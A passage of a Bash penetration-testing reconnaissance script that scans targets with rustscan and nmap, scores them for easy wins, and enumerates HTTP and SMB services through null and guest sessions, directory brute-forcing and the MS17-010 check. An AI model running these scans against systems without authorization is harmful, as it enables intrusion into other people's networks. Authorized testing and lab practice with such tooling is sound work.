    local nmap_quick="${target_dir}/scans/nmap_quick.nmap"
    if [[ ! -f "$nmap_quick" ]]; then
        info "Fast port scan (top 100)..."
        timeout 90 nmap -sV -sC --top-ports 100 -T4 --open -oN "$nmap_quick" "$ip" 2>/dev/null || true
    fi

    if [[ ! -s "$nmap_quick" ]]; then
        warn "  No nmap output — target may be down"
        echo "SCORE: 0 — no open ports or target down" > "$qw_file"
        QW_SCORES["$ip"]=0
        QW_REASONS["$ip"]="no response"
        return
    fi

    # Count open ports (more ports = more attack surface)
    local port_count
    port_count=$(grep -cP '^\d+/tcp\s+open' "$nmap_quick" 2>/dev/null); port_count=${port_count:-0}
    (( score += port_count ))

    # 2. Check anonymous FTP
    if grep -qP '21/tcp\s+open' "$nmap_quick" 2>/dev/null; then
        if grep -qi "Anonymous FTP login allowed" "$nmap_quick" 2>/dev/null; then
            (( score += 5 ))
            reasons+="ANON_FTP "
            success "  ★ Anonymous FTP allowed!"
        fi
    fi

    # 3. Check anonymous SMB
    if grep -qP '445/tcp\s+open' "$nmap_quick" 2>/dev/null; then
        local smb_out
        smb_out=$(timeout 15 smbclient -L "//${ip}" -N 2>&1) || true
        if echo "$smb_out" | grep -qiE 'Sharename|IPC\$'; then
            local share_count
            share_count=$(echo "$smb_out" | grep -c 'Disk' 2>/dev/null); share_count=${share_count:-0}
            if (( share_count > 0 )); then
                (( score += 3 + share_count ))
                reasons+="ANON_SMB(${share_count}_shares) "
                success "  ★ Anonymous SMB — ${share_count} share(s) visible!"
            fi
        fi
    fi

    # 4. Check for HTTP services and probe for easy wins
    local http_ports
    http_ports=$(grep -oP '(\d+)/tcp\s+open\s+\S*http' "$nmap_quick" 2>/dev/null | grep -oP '^\d+' | head -5)
    for hp in $http_ports; do
        local proto="http"
        (( hp == 443 || hp == 8443 )) && proto="https"

        # robots.txt
        local robots
        robots=$(timeout 10 curl -sk "${proto}://${ip}:${hp}/robots.txt" 2>/dev/null) || true
        if [[ -n "$robots" ]] && echo "$robots" | grep -qiE 'Disallow|Allow'; then
            (( score += 2 ))
            reasons+="ROBOTS(${hp}) "
            echo "$robots" >> "$qw_file"
            # Check for sensitive paths
            if echo "$robots" | grep -qiE 'admin|backup|secret|password|private|config|database|upload'; then
                (( score += 3 ))
                reasons+="SENSITIVE_PATHS(${hp}) "
                success "  ★ Sensitive paths in robots.txt on port ${hp}!"
            fi
        fi

        # HTML comments with passwords
        local index
        index=$(timeout 10 curl -sk "${proto}://${ip}:${hp}/" 2>/dev/null) || true
        if [[ -n "$index" ]]; then
            local pw_comments
            pw_comments=$(echo "$index" | grep -oP '<!--.*?-->' | grep -iE 'pass|pwd|cred|secret|login|admin|TODO|FIXME|hack' 2>/dev/null) || true
            if [[ -n "$pw_comments" ]]; then
                (( score += 5 ))
                reasons+="HTML_COMMENT(${hp}) "
                success "  ★ Interesting HTML comments on port ${hp}!"
                echo "$pw_comments" >> "$qw_file"
            fi
        fi

        # Default creds on common login pages
        local login_page
        for path in "/login" "/admin" "/wp-login.php" "/phpmyadmin/"; do
            login_page=$(timeout 5 curl -sk -o /dev/null -w "%{http_code}" "${proto}://${ip}:${hp}${path}" 2>/dev/null) || true
            if [[ "$login_page" == "200" || "$login_page" == "301" || "$login_page" == "302" ]]; then
                (( score += 2 ))
                reasons+="LOGIN_PAGE(${hp}${path}) "
                info "  Login page found: ${proto}://${ip}:${hp}${path}"
            fi
        done
    done

    # 5. Searchsploit against service versions
    if command -v searchsploit &>/dev/null; then
        local services
        services=$(grep -oP '\d+/tcp\s+open\s+\S+\s+\K.+' "$nmap_quick" 2>/dev/null | head -10)
        if [[ -n "$services" ]]; then
            local sploit_out
            sploit_out=$(timeout 30 searchsploit --nmap "$nmap_quick" 2>/dev/null) || true
            if [[ -n "$sploit_out" ]] && echo "$sploit_out" | grep -qvE '^$|No Results|Exploit Title'; then
                local exploit_count
                exploit_count=$(echo "$sploit_out" | grep -cP '\S+\s+\|' 2>/dev/null); exploit_count=${exploit_count:-0}
                if (( exploit_count > 0 )); then
                    (( score += exploit_count * 3 ))
                    reasons+="EXPLOITS(${exploit_count}) "
                    success "  ★ ${exploit_count} potential exploit(s) found via searchsploit!"
                    echo "$sploit_out" >> "$qw_file"
                fi
            fi
        fi
    fi

    # Write results
    {
        echo "QUICK-WINS TRIAGE: ${ip}"
        echo "Score: ${score}"
        echo "Reasons: ${reasons:-none}"
        echo "Open ports: ${port_count}"
        echo ""
    } >> "$qw_file"

    QW_SCORES["$ip"]=$score
    QW_REASONS["$ip"]="${reasons:-none}"
    success "Triage score for ${ip}: ${BOLD}${score}${NC} [${reasons:-clean}]"
}

qw_rank_targets() {
    local priority_file="${RECON_DIR}/target_priority.txt"

    echo ""
    echo -e "${BOLD}${CYAN}════════════════════════════════════════════════════════════${NC}"
    echo -e "${BOLD}${CYAN}  TARGET PRIORITY — Attack easiest first${NC}"
    echo -e "${BOLD}${CYAN}════════════════════════════════════════════════════════════${NC}"
    echo ""

    # Sort by score descending
    local sorted
    sorted=$(for ip in "${!QW_SCORES[@]}"; do
        echo "${QW_SCORES[$ip]} $ip ${QW_REASONS[$ip]}"
    done | sort -rn)

    local rank=1
    {
        echo "TARGET PRIORITY — $(date)"
        echo "═══════════════════════════════"
        echo ""
    } > "$priority_file"

    while read -r score ip reasons; do
        [[ -z "$ip" ]] && continue
        local color="$NC"
        if (( score >= 10 )); then
            color="$GREEN"
        elif (( score >= 5 )); then
            color="$YELLOW"
        else
            color="$RED"
        fi
        echo -e "  ${BOLD}#${rank}${NC} ${color}${ip}${NC}  score=${score}  ${CYAN}[${reasons}]${NC}"
        echo "#${rank}  ${ip}  score=${score}  [${reasons}]" >> "$priority_file"
        (( rank++ ))
    done <<< "$sorted"

    echo ""
    echo -e "${BOLD}Recommendation:${NC} Start with #1 (highest attack surface)"
    echo -e "Priority file: ${CYAN}${priority_file}${NC}"
    echo ""
}

#------------------------------------------------------------------------------
# PHASE 1: TCP PORT DISCOVERY — rustscan with nmap fallback
#------------------------------------------------------------------------------
run_nmap_tcp_discovery() {
    local ip="$1"
    local target_dir="$2"
    local outbase="$target_dir/scans/nmap_full_tcp_discovery"
    local outfile="$target_dir/scans/nmap_full_tcp_discovery_console.txt"

    if is_phase_done "$target_dir" "nmap_tcp_discovery"; then
        info "Nmap TCP discovery already completed for $ip — skipping"
        return 0
    fi

    phase "TCP Port Discovery (nmap fallback) → $ip"
    progress_log "$target_dir" "START" "nmap_tcp_discovery" "min_rate=$NMAP_DISCOVERY_MIN_RATE"
    _tool_start "nmap -p-" "$ip" "${NMAP_DISCOVERY_TIMEOUT}s  min-rate: $NMAP_DISCOVERY_MIN_RATE"
    local _nm_t0
    _nm_t0=$(date +%s)

    local scan_ok=true
    if ! timeout "$NMAP_DISCOVERY_TIMEOUT" nmap -Pn -n --open -p- \
        --min-rate "$NMAP_DISCOVERY_MIN_RATE" \
        --max-retries 2 \
        --reason \
        -oA "$outbase" \
        "$ip" 2>&1 | tee "$outfile"; then
        scan_ok=false
    fi
    _tool_done "nmap -p-" "$_nm_t0"

    local ports=""
    ports=$(grep -P '^\d+/tcp\s+open\s' "${outbase}.nmap" 2>/dev/null | awk '{print $1}' | cut -d/ -f1 | sort -un | tr '\n' ',' | sed 's/,$//')
    if [[ -z "$ports" ]]; then
        warn "No open TCP ports found on $ip via nmap discovery"
        echo "NO_OPEN_PORTS" > "$target_dir/scans/tcp_ports.txt"
        if [[ "$scan_ok" == "true" ]]; then
            progress_log "$target_dir" "DONE" "nmap_tcp_discovery" "ports=NONE"
            return 0
        fi
        progress_log "$target_dir" "FAIL" "nmap_tcp_discovery" "timeout=${NMAP_DISCOVERY_TIMEOUT}s"
        return 1
    fi

    echo "$ports" > "$target_dir/scans/tcp_ports.txt"
    success "Nmap discovery found TCP port(s) on $ip: $ports"
    progress_log "$target_dir" "DONE" "nmap_tcp_discovery" "ports=$ports"
    return 0
}

run_rustscan() {
    local ip="$1"
    local target_dir="$2"
    local outfile="$target_dir/scans/rustscan_tcp.txt"

    if is_phase_done "$target_dir" "rustscan"; then
        info "Rustscan already completed for $ip — skipping (delete progress.log to re-run)"
        return 0
    fi

    if ! check_tool rustscan; then
        warn "rustscan missing — using nmap full TCP discovery fallback"
        run_nmap_tcp_discovery "$ip" "$target_dir"
        return $?
    fi

    phase "TCP Port Discovery (rustscan) → $ip"
    progress_log "$target_dir" "START" "rustscan" "batch_size=$RUSTSCAN_BATCH_SIZE"
    _tool_start "rustscan" "$ip" "${RUSTSCAN_OUTER_TIMEOUT}s  batch: $RUSTSCAN_BATCH_SIZE"
    local _rs_t0
    _rs_t0=$(date +%s)

    # rustscan 2.4.x outputs "Open <IP>:<PORT>" lines when NOT in greppable mode.
    # --scripts none = skip nmap handoff (replaces deprecated --no-nmap)
    # NO --greppable: we need the "Open IP:PORT" lines for parsing.
    # Final summary line "IP -> [port,port]" is also printed with --scripts none.
    timeout "$RUSTSCAN_OUTER_TIMEOUT" rustscan -a "$ip" \
        --range 1-65535 \
        -b "$RUSTSCAN_BATCH_SIZE" \
        --timeout "$RUSTSCAN_TIMEOUT" \
        --scripts none \
        --no-banner \
        2>&1 | tee "$outfile"
    local rustscan_exit=$?
    _tool_done "rustscan" "$_rs_t0"

    # Parse open ports FIRST — rustscan may have found ports before hitting the
    # 300s outer timeout (exit=124). Only treat as failure if we got nothing.
    # Format 1 (per-port): "Open 10.10.10.5:22"
    local ports=""
    ports=$(grep -oP 'Open \S+:\K[0-9]+' "$outfile" 2>/dev/null | sort -un | tr '\n' ',' | sed 's/,$//')

    if [[ $rustscan_exit -ne 0 && -z "$ports" ]]; then
        error "Rustscan failed or timed out for $ip (exit=$rustscan_exit, no ports captured)"
        progress_log "$target_dir" "FAIL" "rustscan" "exit=$rustscan_exit"
        warn "Falling back to nmap full TCP discovery"
        run_nmap_tcp_discovery "$ip" "$target_dir"
        return $?
    fi

    if [[ $rustscan_exit -eq 124 && -n "$ports" ]]; then
        warn "Rustscan hit ${RUSTSCAN_OUTER_TIMEOUT}s timeout but captured partial results — accepting $ports"
        progress_log "$target_dir" "PARTIAL" "rustscan" "exit=124 ports=$ports"
    fi

    if [[ -z "$ports" ]]; then
        # Format 2 (summary line): "10.10.10.5 -> [22,80,443]"
        ports=$(grep -oP '\->\s*\[\K[^\]]+' "$outfile" 2>/dev/null | tr ',' '\n' | sort -un | tr '\n' ',' | sed 's/,$//')
    fi

    if [[ -z "$ports" ]]; then
        # Format 3 (older rustscan): lines with port/open
        ports=$(grep -oP '(?:^|\s)(\d+)(?:/open)' "$outfile" 2>/dev/null | grep -oP '\d+' | sort -un | tr '\n' ',' | sed 's/,$//')
    fi

    if [[ -z "$ports" ]]; then
        warn "Rustscan found no TCP ports on $ip — validating with nmap full TCP discovery"
        progress_log "$target_dir" "DONE" "rustscan" "ports=NONE"
        run_nmap_tcp_discovery "$ip" "$target_dir"
        return $?
    fi

    echo "$ports" > "$target_dir/scans/tcp_ports.txt"
    local port_count=""
    port_count=$(echo "$ports" | tr ',' '\n' | wc -l)
    success "Found $port_count open TCP port(s) on $ip: $ports"
    progress_log "$target_dir" "DONE" "rustscan" "ports=$ports"
    return 0
}

#------------------------------------------------------------------------------
# PHASE 2: NMAP TCP — Service Detection on Found Ports
#------------------------------------------------------------------------------
run_nmap_tcp() {
    local ip="$1"
    local target_dir="$2"
    local ports_file="$target_dir/scans/tcp_ports.txt"
    local outbase="$target_dir/scans/nmap_tcp"

    if is_phase_done "$target_dir" "nmap_tcp"; then
        info "Nmap TCP already completed for $ip — skipping"
        return 0
    fi

    local ports=""
    ports=$(cat "$ports_file" 2>/dev/null)
    if [[ -z "$ports" || "$ports" == "NO_OPEN_PORTS" ]]; then
        warn "No TCP ports to scan for $ip"
        return 0
    fi

    phase "TCP Service Detection (nmap) → $ip"
    progress_log "$target_dir" "START" "nmap_tcp" "ports=$ports"

    # -sV: version detection, --script default,vulners: default NSE + CVE mapping from banners
    # -O: OS detection (requires root); -oA: output in all formats (grep, xml, nmap)
    local nmap_flags=(-sV --version-intensity 7 --script "default,vulners" --script-timeout 45s \
        -p "$ports" --open --reason -oA "$outbase")

    if [[ $EUID -eq 0 ]]; then
        # Running as root — include OS detection
        nmap_flags+=(-O)
    else
        # Not root — -O would fail and could break the scan
        warn "Not running as root — skipping nmap -O (OS detection). Run as root for full results."
    fi

    _tool_start "nmap -sCV" "$ip" "${NMAP_TCP_TIMEOUT}s  ports: $ports"
    local _nmap_t0
    _nmap_t0=$(date +%s)
    local tcp_scan_ok=true
    if ! timeout "$NMAP_TCP_TIMEOUT" nmap "${nmap_flags[@]}" \
        "$ip" 2>&1 | tee "$target_dir/scans/nmap_tcp_console.txt"; then
        tcp_scan_ok=false
        error "Nmap TCP scan failed or timed out for $ip"
        progress_log "$target_dir" "FAIL" "nmap_tcp" "timeout=${NMAP_TCP_TIMEOUT}s"
        warn "Partial TCP scan output may still exist in $target_dir/scans/"
    fi
    _tool_done "nmap -sCV" "$_nmap_t0"

    if [[ "$tcp_scan_ok" == "true" ]]; then
        success "Nmap TCP scan complete for $ip"
        progress_log "$target_dir" "DONE" "nmap_tcp" "output=$outbase"
        return 0
    fi

    return 1
}

#------------------------------------------------------------------------------
# PHASE 3: NMAP UDP — Top Ports (SNMP is OffSec gold)
#------------------------------------------------------------------------------
run_nmap_udp() {
    local ip="$1"
    local target_dir="$2"
    local outbase="$target_dir/scans/nmap_udp"

    if is_phase_done "$target_dir" "nmap_udp"; then
        info "Nmap UDP already completed for $ip — skipping"
        return 0
    fi

    phase "UDP Top-Port Scan (nmap) → $ip"
    progress_log "$target_dir" "START" "nmap_udp" "top_ports=$UDP_TOP_PORTS"

    # UDP scanning requires root. Do not prompt with sudo from a background job.
    if [[ $EUID -ne 0 ]]; then
        warn "UDP scan requires root privileges — skipping in non-root mode"
        progress_log "$target_dir" "SKIP" "nmap_udp" "requires_root=true"
        return 0
    fi

    # --- Pass 1: High-signal UDP ports (quick, OffSec-practical) ---
    _tool_start "nmap -sU quick" "$ip" "${NMAP_UDP_QUICK_TIMEOUT}s  ports: $UDP_QUICK_PORTS"
    local _udp_q_t0
    _udp_q_t0=$(date +%s)
    local udp_quick_ok=true
    timeout "$NMAP_UDP_QUICK_TIMEOUT" nmap -sU -sV \
        -p "$UDP_QUICK_PORTS" \
        --open \
        --reason \
        --max-retries 2 \
        --version-intensity 0 \
        -oA "${outbase}_quick" \
        "$ip" 2>&1 | tee "$target_dir/scans/nmap_udp_quick_console.txt" || udp_quick_ok=false
    _tool_done "nmap -sU quick" "$_udp_q_t0"
    if [[ "$udp_quick_ok" == "false" ]]; then
        warn "Quick UDP scan failed or timed out for $ip"
    fi

    # --- Pass 2: Top ports (broader sweep) ---
    _tool_start "nmap -sU" "$ip" "${NMAP_UDP_TIMEOUT}s  top: $UDP_TOP_PORTS ports"
    local _udp_t0
    _udp_t0=$(date +%s)
    info "Scanning top $UDP_TOP_PORTS UDP ports (this runs in background)"

    local udp_scan_ok=true
    timeout "$NMAP_UDP_TIMEOUT" nmap -sU -sV \
        --top-ports "$UDP_TOP_PORTS" \
        --open \
        --reason \
        --max-retries 2 \
        --version-intensity 0 \
        -oA "$outbase" \
        "$ip" 2>&1 | tee "$target_dir/scans/nmap_udp_console.txt" || udp_scan_ok=false
    _tool_done "nmap -sU" "$_udp_t0"
    if [[ "$udp_scan_ok" == "false" ]]; then
        warn "Nmap UDP scan failed or timed out for $ip (this is normal if not root)"
        progress_log "$target_dir" "FAIL" "nmap_udp" "timeout=${NMAP_UDP_TIMEOUT}s"
    fi

    # --- Pass 2: Full UDP scan (only if --udp-full flag set) ---
    if [[ "$UDP_FULL" == "true" ]] && ! is_phase_done "$target_dir" "nmap_udp_full"; then
        info "Full UDP scan requested (--udp-full) — scanning all 65535 ports"
        info "This will take a LONG time. Results saved as nmap_udp_full.*"
        warn "Tip: if you're stuck on a box, this is worth the wait"
        progress_log "$target_dir" "START" "nmap_udp_full" "ports=1-65535"

        # Use aggressive timing and skip version detection to speed it up
        # --max-retries 1 cuts time dramatically (at slight accuracy cost)
        timeout 3600 nmap -sU \
            -p 1-65535 \
            --open \
            --max-retries 1 \
            --min-rate 500 \
            -T4 \
            -oA "${outbase}_full" \
            "$ip" 2>&1 | tee "$target_dir/scans/nmap_udp_full_console.txt" || true

        # Merge any new ports into udp_ports.txt
        local full_udp_ports=""
        full_udp_ports=$(grep -P '^\d+/udp\s+open\s' "${outbase}_full.nmap" 2>/dev/null | \
            awk '{print $1}' | cut -d/ -f1 | tr '\n' ',' | sed 's/,$//')
        if [[ -n "$full_udp_ports" ]]; then
            success "Full UDP scan found ports: $full_udp_ports"
            # Merge with existing
            {
                cat "$target_dir/scans/udp_ports.txt" 2>/dev/null
                echo "$full_udp_ports"
            } | tr ',' '\n' | sort -un | tr '\n' ',' | sed 's/,$//' \
                > "$target_dir/scans/udp_ports_merged.txt"
            mv "$target_dir/scans/udp_ports_merged.txt" "$target_dir/scans/udp_ports.txt"
        fi
        progress_log "$target_dir" "DONE" "nmap_udp_full" "ports=${full_udp_ports:-NONE}"
    fi

    # Parse UDP findings
    local udp_ports=""
    udp_ports=$(
        {
            grep -P '^\d+/udp\s+open\s' "${outbase}_quick.nmap" 2>/dev/null || true
            grep -P '^\d+/udp\s+open\s' "${outbase}.nmap" 2>/dev/null || true
        } | awk '{print $1}' | cut -d/ -f1 | sort -un | tr '\n' ',' | sed 's/,$//'
    )
    if [[ -n "$udp_ports" ]]; then
        echo "$udp_ports" > "$target_dir/scans/udp_ports.txt"
        success "Found open UDP port(s): $udp_ports"
    else
        info "No open UDP ports found (or all filtered)"
    fi

    if [[ "$udp_scan_ok" == "true" ]]; then
        progress_log "$target_dir" "DONE" "nmap_udp" "ports=${udp_ports:-NONE}"
    fi
    return 0
}

#------------------------------------------------------------------------------
# SERVICE ENUMERATION MODULES
# Each function:
#   - Takes (ip, port, target_dir) as arguments
#   - Handles its own timeout and error handling
#   - Writes to its own subdirectory
#   - Logs progress
#   - Never crashes the parent
#------------------------------------------------------------------------------

#--- HTTP/HTTPS ENUMERATION ---------------------------------------------------
enum_http() {
    local ip="$1"
    local port="$2"
    local target_dir="$3"
    local nmap_service="$4"
    local proto="http"
    local outdir="$target_dir/tcp/http/port_${port}"
    mkdir -p "$outdir"

    local phase_name="http_${port}"
    if is_phase_done "$target_dir" "$phase_name"; then
        info "HTTP enum already done for $ip:$port — skipping"
        return 0
    fi
    progress_log "$target_dir" "START" "$phase_name" ""

    # Determine HTTP vs HTTPS
    if is_ssl_port "$port" "$nmap_service"; then
        proto="https"
    fi
    local url="${proto}://${ip}:${port}"

    info "HTTP enumeration starting: $url"

    # --- WhatWeb (quick fingerprint) ---
    if check_tool whatweb; then
        info "  → whatweb $url"
        timeout "$GENERIC_TIMEOUT" whatweb -a 3 --colour=never "$url" \
            > "$outdir/whatweb.txt" 2>&1 || true
    fi

    # --- Curl headers (always useful, fast) ---
    info "  → curl headers $url"
    timeout 15 curl -skIL "$url" > "$outdir/curl_headers.txt" 2>&1 || true

    # --- TLS and WAF hints (only when tools are present) ---
    if [[ "$proto" == "https" ]]; then
        if check_tool sslscan; then
            info "  → sslscan $ip:$port"
            timeout "$GENERIC_TIMEOUT" sslscan "$ip:$port" > "$outdir/sslscan.txt" 2>&1 || true
        fi
        if check_tool openssl; then
            info "  → TLS certificate names"
            # shellcheck disable=SC2016
            timeout 20 bash -c '
                echo | openssl s_client -connect "$1:$2" -servername "$1" 2>/dev/null |
                    openssl x509 -noout -subject -issuer -dates -ext subjectAltName 2>/dev/null
            ' -- "$ip" "$port" > "$outdir/tls_certificate.txt" 2>&1 || true
            grep -oP 'DNS:\K[^,\s]+' "$outdir/tls_certificate.txt" 2>/dev/null | sort -u > "$outdir/tls_names.txt" || true
            if is_nonempty_file "$outdir/tls_names.txt"; then
                quick_win "$target_dir" "TLS names on $ip:$port — see $outdir/tls_names.txt" "echo | openssl s_client -connect $ip:$port -servername $ip 2>/dev/null | openssl x509 -noout -ext subjectAltName"
            fi
        fi
    fi

    if check_tool wafw00f; then
        info "  → wafw00f $url"
        timeout "$GENERIC_TIMEOUT" wafw00f "$url" > "$outdir/wafw00f.txt" 2>&1 || true
    fi

    # --- HTTP methods (only recorded; next-step logic decides if risky) ---
    info "  → HTTP OPTIONS methods $url"
    timeout 15 curl -skIX OPTIONS "$url" > "$outdir/http_methods.txt" 2>&1 || true

    # --- Check for robots.txt ---
    info "  → checking robots.txt"
    timeout 15 curl -sk "${url}/robots.txt" > "$outdir/robots.txt" 2>&1 || true
    # If robots.txt is a 404-like response, note it
    if grep -qiE '<!DOCTYPE|<html|not found|404' "$outdir/robots.txt" 2>/dev/null; then
        echo "# No robots.txt found (got HTML/404 response)" > "$outdir/robots.txt"
    fi

    # --- Nikto / Gobuster / Feroxbuster ---
    # Skip brute-force tools on WinRM/management HTTP endpoints (5985, 5986, 47001).
    # These respond with HTTP but have no meaningful web content to enumerate.
    if is_web_brute_target "$port"; then
        # --- Nikto (vulnerability scanner) ---
        if check_tool nikto; then
            _tool_start "nikto" "$url" "${NIKTO_TIMEOUT}s"
            local _nikto_t0
            _nikto_t0=$(date +%s)
            # Nikto 2.6.0 auto-appends a format extension to -o, so passing
            # "-o nikto.txt" produces "nikto.txt.txt". Pass the basename only
            # and force -Format txt so we get a single-extension "nikto.txt".
            timeout "$NIKTO_TIMEOUT" nikto -h "$url" -o "$outdir/nikto" \
                -Format txt -nointeractive 2>&1 | tail -5 || true
            _tool_done "nikto" "$_nikto_t0"
        fi

        # --- Gobuster (directory brute-force) ---
        if check_tool gobuster; then
            if [[ -f "$GOBUSTER_WORDLIST" ]]; then
                _tool_start "gobuster" "$url" "${GOBUSTER_RUNTIME}s  req-timeout: ${GOBUSTER_TIMEOUT}s"
                local _gobuster_t0
                _gobuster_t0=$(date +%s)
                local gobuster_flags=(-u "$url" -w "$GOBUSTER_WORDLIST" \
                    -t "$GOBUSTER_THREADS" \
                    --timeout "${GOBUSTER_TIMEOUT}s" \
                    -o "$outdir/gobuster_dir.txt" \
                    -x "$GOBUSTER_EXTENSIONS" \
                    --no-error -q)
                # Add -k for HTTPS (skip cert verification)
                [[ "$proto" == "https" ]] && gobuster_flags+=(-k)

                timeout "$GOBUSTER_RUNTIME" gobuster dir "${gobuster_flags[@]}" 2>&1 | tail -3 || true
                _tool_done "gobuster" "$_gobuster_t0"
            else
                warn "  Gobuster wordlist not found: $GOBUSTER_WORDLIST"
            fi
        fi

        # --- Feroxbuster (recursive, only when gobuster is sparse on a real web port) ---
        if check_tool feroxbuster; then
            local gobuster_hits=""
            # Count only actual result lines (start with /) — wc -l is unreliable due to gobuster headers
            gobuster_hits=$(grep -c '^/' "$outdir/gobuster_dir.txt" 2>/dev/null); gobuster_hits=${gobuster_hits:-0}
            if (( gobuster_hits < 5 )); then
                info "  → feroxbuster $url (gobuster found <5 results, trying recursive)"
                _tool_start "feroxbuster" "$url" "${FEROX_RUNTIME}s"
                local _ferox_t0
                _ferox_t0=$(date +%s)
                # Clean slate — feroxbuster appends to -o file, stacking config dumps across runs
                rm -f "$outdir/feroxbuster.txt"
                local ferox_flags=(-u "$url" -w "$GOBUSTER_WORDLIST" \
                    -t 30 --timeout 30 -d 2 -q --no-state \
                    --filter-status 404 --filter-status 500 \
                    --filter-status 502 --filter-status 503 \
                    -o "$outdir/feroxbuster.txt")
                [[ "$proto" == "https" ]] && ferox_flags+=(-k)
                timeout "$FEROX_RUNTIME" feroxbuster "${ferox_flags[@]}" 2>&1 | tail -3 || true
                _tool_done "feroxbuster" "$_ferox_t0"
            fi
        fi
    else
        info "  → skipping nikto/gobuster/feroxbuster on port $port (WinRM/management HTTP — not a web app)"
        echo "# Port $port: WinRM/HTTPAPI endpoint — brute-force tools skipped" > "$outdir/brute_skip.txt"
    fi

    # --- ffuf vhost fuzz (if hostname detected) ---
    # Runs before progress_log DONE so phase resume re-runs it if interrupted
    if check_tool ffuf && [[ -f "/usr/share/seclists/Discovery/DNS/subdomains-top1million-5000.txt" ]]; then
        # Only run if we have a hostname (not a bare IP)
        if [[ "$ip" =~ [a-zA-Z] ]]; then
            info "  → ffuf vhost fuzz $url"
            local baseline_size=""
            baseline_size=$(curl -sk "${url}/$(tr -dc '[:lower:]' </dev/urandom | head -c12)" -o /dev/null -w '%{size_download}' 2>/dev/null || echo "0")
            timeout 300 ffuf -w /usr/share/seclists/Discovery/DNS/subdomains-top1million-5000.txt \
                -u "$url" -H "Host: FUZZ.${ip}" -fs "$baseline_size" \
                -t 30 -noninteractive -of json -o "$outdir/ffuf_vhosts.json" \
                2>/dev/null || true
            if [[ -f "$outdir/ffuf_vhosts.json" ]]; then
                local vhost_count=""
                if command -v jq &>/dev/null; then
                    vhost_count=$(jq '.results | length' "$outdir/ffuf_vhosts.json" 2>/dev/null || echo "0")
                else
                    # Count result objects by their unique "url" field (one per result)
                    vhost_count=$(grep -c '"url"' "$outdir/ffuf_vhosts.json" 2>/dev/null); vhost_count=${vhost_count:-0}
                fi
                if (( vhost_count > 0 )); then
                    success "  ★ ffuf found $vhost_count potential vhost(s) → $outdir/ffuf_vhosts.json"
                    quick_win "$target_dir" "VHOSTS found on $ip:$port — see $outdir/ffuf_vhosts.json" "ffuf -w /usr/share/seclists/Discovery/DNS/subdomains-top1million-5000.txt -u $url -H 'Host: FUZZ.$ip' -fs $baseline_size -t 30"
                else
                    info "  ffuf vhost fuzz complete — no vhosts found"
                fi
            fi
        fi
    fi

    success "HTTP enumeration complete for $ip:$port"
    progress_log "$target_dir" "DONE" "$phase_name" "proto=$proto"
}

#--- SMB ENUMERATION ----------------------------------------------------------
enum_smb() {
    local ip="$1"
    local port="$2"
    local target_dir="$3"
    local outdir="$target_dir/tcp/smb"
    mkdir -p "$outdir"

    if is_phase_done "$target_dir" "smb"; then
        info "SMB enum already done for $ip — skipping"
        return 0
    fi
    progress_log "$target_dir" "START" "smb" "port=$port"

    info "SMB enumeration starting: $ip"

    if check_tool nmblookup; then
        info "  → nmblookup NetBIOS names"
        timeout 30 nmblookup -A "$ip" > "$outdir/nmblookup.txt" 2>&1 || true
    fi
    if check_tool nbtscan; then
        info "  → nbtscan NetBIOS summary"
        timeout 30 nbtscan "$ip" > "$outdir/nbtscan.txt" 2>&1 || true
    fi

    # --- enum4linux-ng (comprehensive SMB enumeration) ---
    if check_tool enum4linux-ng; then
        _tool_start "enum4linux-ng" "$ip" "${ENUM4LINUX_TIMEOUT}s"
        local _e4l_t0
        _e4l_t0=$(date +%s)
        timeout "$ENUM4LINUX_TIMEOUT" enum4linux-ng -A "$ip" \
            -oJ "$outdir/enum4linux" 2>&1 | tee "$outdir/enum4linux_console.txt" | tail -10 || true
        _tool_done "enum4linux-ng" "$_e4l_t0"
    elif check_tool enum4linux; then
        # Fallback to classic enum4linux
        _tool_start "enum4linux" "$ip" "${ENUM4LINUX_TIMEOUT}s"
        local _e4l_t0
        _e4l_t0=$(date +%s)
        timeout "$ENUM4LINUX_TIMEOUT" enum4linux -a "$ip" \
            > "$outdir/enum4linux.txt" 2>&1 || true
        _tool_done "enum4linux" "$_e4l_t0"
    fi

    # --- smbmap (share enumeration with access levels) ---
    if check_tool smbmap; then
        info "  → smbmap $ip (null session)"
        timeout "$SMBMAP_TIMEOUT" smbmap -H "$ip" \
            > "$outdir/smbmap_null.txt" 2>&1 || true

        # Guest access too
        info "  → smbmap $ip (guest session)"
        timeout "$SMBMAP_TIMEOUT" smbmap -H "$ip" -u 'guest' -p '' \
            > "$outdir/smbmap_guest.txt" 2>&1 || true
    fi

    # --- smbclient (list shares with null session) ---
    if check_tool smbclient; then
        info "  → smbclient list shares $ip"
        timeout 30 smbclient -L "//$ip" -N \
            > "$outdir/smbclient_list.txt" 2>&1 || true
    fi

    # --- netexec for quick wins ---
    if check_tool netexec; then
        info "  → netexec smb $ip"
        timeout "$GENERIC_TIMEOUT" netexec smb "$ip" --shares -u '' -p '' \
            > "$outdir/netexec_shares.txt" 2>&1 || true
    fi

    # --- SMB vuln + signing check (enumeration only — nmap scripts do not exploit) ---
    info "  → nmap SMB vuln scripts (ms17-010, signing)"
    timeout 180 nmap --script=smb-vuln-ms17-010,smb2-security-mode,smb-protocols \
        -p 445 -oN "$outdir/nmap_smb_vuln.txt" "$ip" 2>&1 | tail -5 || true

    local _smb_vuln_cmd="nmap --script=smb-vuln-ms17-010,smb2-security-mode,smb-protocols -p 445 $ip -oN $outdir/nmap_smb_vuln.txt"
    if grep -qiE 'VULNERABLE.*MS17-010|State: VULNERABLE' "$outdir/nmap_smb_vuln.txt" 2>/dev/null; then
        success "  ★ SMB VULNERABLE TO MS17-010 (EternalBlue) on $ip ★"
        quick_win "$target_dir" "SMB MS17-010 VULNERABLE on $ip" "$_smb_vuln_cmd"
    fi
    if grep -qiE 'message signing.*disabled|message_signing.*disabled|Message signing enabled but not required' "$outdir/nmap_smb_vuln.txt" 2>/dev/null; then
        success "  ★ SMB signing not required on $ip — relay candidate ★"
        quick_win "$target_dir" "SMB SIGNING NOT REQUIRED on $ip — relay target" "$_smb_vuln_cmd"
    fi

    # --- Extract notable findings ---
    {
        echo "=== SMB Quick Findings for $ip ==="
        echo ""
        if [[ -f "$outdir/smbmap_null.txt" ]]; then
            echo "--- Readable Shares (null session) ---"
            grep -E 'READ|WRITE' "$outdir/smbmap_null.txt" 2>/dev/null || echo "  (none)"
        fi
        if [[ -f "$outdir/smbmap_guest.txt" ]]; then
            echo ""
            echo "--- Readable Shares (guest session) ---"
            grep -E 'READ|WRITE' "$outdir/smbmap_guest.txt" 2>/dev/null || echo "  (none)"
        fi
    } > "$outdir/smb_quick_findings.txt"

    success "SMB enumeration complete for $ip"
